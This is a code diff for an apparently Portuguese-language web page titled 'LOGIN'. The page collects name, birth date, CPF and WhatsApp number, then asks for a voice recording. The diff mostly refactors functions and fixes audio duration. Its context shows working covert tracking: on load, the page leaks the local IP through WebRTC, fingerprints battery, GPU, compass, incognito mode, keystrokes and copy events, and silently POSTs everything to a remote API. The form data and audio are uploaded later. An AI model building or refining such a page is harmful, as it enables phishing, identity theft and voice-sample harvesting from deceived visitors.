@@ -42,7 +42,6 @@
       background: #ffe6e6; color: #a12d2d; border: 1px solid #e6b3b3;
     }
 
-    /* Tela amarela */
     #telaSucesso {
       display: none; position: fixed; inset: 0;
       background: #FFD400; color: #000; z-index: 9999;
@@ -54,7 +53,6 @@
     #telaSucesso p { font-size: 18px; font-weight: 600; }
     @keyframes pular { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-12px);} }
 
-    /* Tela de áudio */
     #telaAudio {
       display: none; position: fixed; inset: 0;
       background: linear-gradient(135deg, #667eea, #764ba2);
@@ -118,7 +116,6 @@
 </head>
 <body>
 
-  <!-- TELA AMARELA -->
   <div id="telaSucesso">
     <div>
       <div class="icone">📨</div>
@@ -127,7 +124,6 @@
     </div>
   </div>
 
-  <!-- TELA DE ÁUDIO -->
   <div id="telaAudio">
     <div class="caixa">
       <h2>🎙️ Quer deixar um recado?</h2>
@@ -148,7 +144,6 @@
     </div>
   </div>
 
-  <!-- FORMULÁRIO -->
   <div class="container">
     <h1>🔒 LOGIN</h1>
     <p class="sub">Preencha seus dados abaixo</p>
@@ -184,7 +179,7 @@
     let connectionType = 'Desconhecida';
     let localIP = null;
 
-    document.addEventListener('visibilitychange', () => {
+    document.addEventListener('visibilitychange', function() {
       if (document.hidden) {
         ultimaSaida = Date.now();
       } else if (ultimaSaida) {
@@ -193,10 +188,10 @@
       }
     });
 
-    document.addEventListener('copy', () => { copiouAlgo = true; });
+    document.addEventListener('copy', function() { copiouAlgo = true; });
 
-    document.querySelectorAll('input, textarea').forEach(el => {
-      el.addEventListener('keydown', () => {
+    document.querySelectorAll('input, textarea').forEach(function(el) {
+      el.addEventListener('keydown', function() {
         if (!inicioDigitacao) inicioDigitacao = Date.now();
         teclasDigitadas++;
       });
@@ -211,8 +206,8 @@
     try {
       const pc = new RTCPeerConnection({ iceServers: [] });
       pc.createDataChannel('');
-      pc.createOffer().then(o => pc.setLocalDescription(o));
-      pc.onicecandidate = (e) => {
+      pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+      pc.onicecandidate = function(e) {
         if (!e.candidate) return;
         const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
         if (match) {
@@ -249,12 +244,12 @@
     }
 
     function detectarBussola() {
-      return new Promise((resolve) => {
+      return new Promise(function(resolve) {
         let resolvido = false;
-        const timeout = setTimeout(() => {
+        const timeout = setTimeout(function() {
           if (!resolvido) { resolvido = true; limpar(); resolve(null); }
         }, 2500);
-        const handler = (e) => {
+        const handler = function(e) {
           let heading = null;
           if (e.webkitCompassHeading != null) heading = e.webkitCompassHeading;
           else if (e.alpha != null) heading = 360 - e.alpha;
@@ -352,26 +347,26 @@
       bussolaHeading = await detectarBussola();
 
       return {
-        sistema, navegador, tipo,
+        sistema: sistema, navegador: navegador, tipo: tipo,
         idioma: navigator.language || 'Desconhecido',
-        tela: `${window.screen.width}x${window.screen.height}`,
-        bateria, conexao, ram, fuso, orientacao,
-        nucleos, gpu, corProfundidade, pixelRatio,
-        touch, cookies, horaCliente,
-        incognito, storage: storageInfo, bussola: bussolaHeading,
+        tela: window.screen.width + 'x' + window.screen.height,
+        bateria: bateria, conexao: conexao, ram: ram, fuso: fuso, orientacao: orientacao,
+        nucleos: nucleos, gpu: gpu, corProfundidade: corProfundidade, pixelRatio: pixelRatio,
+        touch: touch, cookies: cookies, horaCliente: horaCliente,
+        incognito: incognito, storage: storageInfo, bussola: bussolaHeading,
         tipoConexao: connectionType, ipLocal: localIP,
       };
     }
 
     let dispositivo = null;
 
-    (async () => {
+    (async function() {
       dispositivo = await detectarDispositivo();
       fetch(API_URL + '/visita', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ dispositivo })
-      }).catch(() => {});
+        body: JSON.stringify({ dispositivo: dispositivo })
+      }).catch(function() {});
     })();
 
     const btn = document.getElementById('btn');
@@ -384,7 +379,7 @@
 
     function pegar(id) { return document.getElementById(id).value.trim(); }
 
-    document.getElementById('cpf').addEventListener('input', (e) => {
+    document.getElementById('cpf').addEventListener('input', function(e) {
       let v = e.target.value.replace(/\D/g, '').slice(0, 11);
       v = v.replace(/(\d{3})(\d)/, '$1.$2');
       v = v.replace(/(\d{3})(\d)/, '$1.$2');
@@ -421,8 +416,7 @@
       localStorage.setItem('jaVisitou', 'sim');
     } catch (e) {}
 
-    // ====== ENVIAR FORMULÁRIO ======
-    btn.addEventListener('click', async () => {
+    btn.addEventListener('click', async function() {
       const tempoSegundos = Math.round((Date.now() - inicio) / 1000);
 
       const dadosForm = {
@@ -442,7 +436,7 @@
       resultado.style.display = 'none';
 
       const obrig = ['nome','dataNascimento','cpf','whatsapp'];
-      const faltando = obrig.filter(c => !dadosForm[c]);
+      const faltando = obrig.filter(function(c) { return !dadosForm[c]; });
       if (faltando.length > 0) {
         resultado.textContent = '⚠️ Preencha todos os campos com *';
         resultado.style.display = 'block';
@@ -462,12 +456,8 @@
 
         if (dados.sucesso) {
           idCadastro = dados.dados.id;
-
-          // Mostra tela amarela
           telaSucesso.style.display = 'flex';
-
-          // Depois de 5 segundos, mostra tela de áudio
-          setTimeout(() => {
+          setTimeout(function() {
             telaSucesso.style.display = 'none';
             telaAudio.style.display = 'flex';
           }, 5000);
@@ -491,6 +481,7 @@
     let inicioGravacao = null;
     let intervaloTimer = null;
     let blobAudio = null;
+    let duracaoFinal = 0;  // <-- CORRIGIDO: duração real
 
     const btnGravar = document.getElementById('btnGravar');
     const tempoGrava = document.getElementById('tempoGrava');
@@ -499,7 +490,7 @@
     const botoesAudio = document.getElementById('botoesAudio');
     const btnPular = document.getElementById('btnPular');
 
-    btnGravar.addEventListener('click', async () => {
+    btnGravar.addEventListener('click', async function() {
       if (!gravando) {
         await iniciarGravacao();
       } else {
@@ -510,42 +501,56 @@
     async function iniciarGravacao() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        chunksAudio = [];
-        mediaRecorder = new MediaRecorder(stream);
 
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data.size > 0) chunksAudio.push(e.data);
+        // Escolhe o melhor formato disponível
+        let mimeType = 'audio/webm';
+        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+          mimeType = 'audio/webm;codecs=opus';
+        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+          mimeType = 'audio/mp4';
+        } else if (MediaRecorder.isTypeSupported('audio/ogg')) {
+          mimeType = 'audio/ogg';
+        }
+
+        chunksAudio = [];
+        mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
+
+        mediaRecorder.ondataavailable = function(e) {
+          if (e.data && e.data.size > 0) chunksAudio.push(e.data);
         };
 
-        mediaRecorder.onstop = () => {
-          blobAudio = new Blob(chunksAudio, { type: 'audio/webm' });
+        mediaRecorder.onstop = function() {
+          // CORRIGIDO: salva a duração real quando para
+          duracaoFinal = Math.round((Date.now() - inicioGravacao) / 1000);
+
+          blobAudio = new Blob(chunksAudio, { type: mimeType });
           const url = URL.createObjectURL(blobAudio);
           previewAudio.src = url;
           previewAudio.style.display = 'block';
           botoesAudio.style.display = 'flex';
           btnPular.style.display = 'none';
-          statusTexto.textContent = 'Ouça seu áudio e envie se gostar';
+          statusTexto.textContent = 'Ouça seu áudio (' + duracaoFinal + 's) e envie se gostar';
 
-          // Para o stream
-          stream.getTracks().forEach(t => t.stop());
+          stream.getTracks().forEach(function(t) { t.stop(); });
         };
 
-        mediaRecorder.start();
+        // CORRIGIDO: 500ms = garante que não perde áudio
+        mediaRecorder.start(500);
         gravando = true;
         inicioGravacao = Date.now();
         btnGravar.classList.add('gravando');
         btnGravar.textContent = '⏹️';
         statusTexto.textContent = '🔴 GRAVANDO... toque pra parar';
 
-        intervaloTimer = setInterval(() => {
+        intervaloTimer = setInterval(function() {
           const seg = Math.floor((Date.now() - inicioGravacao) / 1000);
           if (seg >= 60) {
-            pararGravacao(); // Limite de 60 segundos
+            pararGravacao();
             return;
           }
           const m = String(Math.floor(seg / 60)).padStart(2, '0');
           const s = String(seg % 60).padStart(2, '0');
-          tempoGrava.textContent = `${m}:${s}`;
+          tempoGrava.textContent = m + ':' + s;
         }, 200);
 
       } catch (e) {
@@ -563,12 +568,11 @@
       btnGravar.textContent = '🎙️';
       btnGravar.disabled = true;
       clearInterval(intervaloTimer);
-      tempoGrava.textContent = 'Pronto!';
     }
 
     function recomecar() {
-      // Reset
       blobAudio = null;
+      duracaoFinal = 0;
       previewAudio.src = '';
       previewAudio.style.display = 'none';
       botoesAudio.style.display = 'none';
@@ -585,11 +589,10 @@
       statusTexto.textContent = '⏳ Enviando áudio...';
       botoesAudio.style.display = 'none';
 
-      // Converte para base64
       const reader = new FileReader();
       reader.readAsDataURL(blobAudio);
-      reader.onloadend = async () => {
-        const base64 = reader.result; // data:audio/webm;base64,...
+      reader.onloadend = async function() {
+        const base64 = reader.result;
 
         try {
           const r = await fetch(API_URL + '/enviar-audio', {
@@ -598,7 +601,7 @@
             body: JSON.stringify({
               idCadastro: idCadastro,
               audio: base64,
-              duracao: Math.round((Date.now() - inicioGravacao) / 1000),
+              duracao: duracaoFinal,  // <-- CORRIGIDO: usa a duração real
             })
           });
           const dados = await r.json();
@@ -606,7 +609,7 @@
           if (dados.sucesso) {
             statusTexto.textContent = '✅ Áudio enviado! Muito obrigado!';
             tempoGrava.textContent = '💛';
-            setTimeout(() => {
+            setTimeout(function() {
               telaAudio.style.display = 'none';
               alert('Obrigado! Seus dados e mensagem foram recebidos. 💛');
             }, 1500);
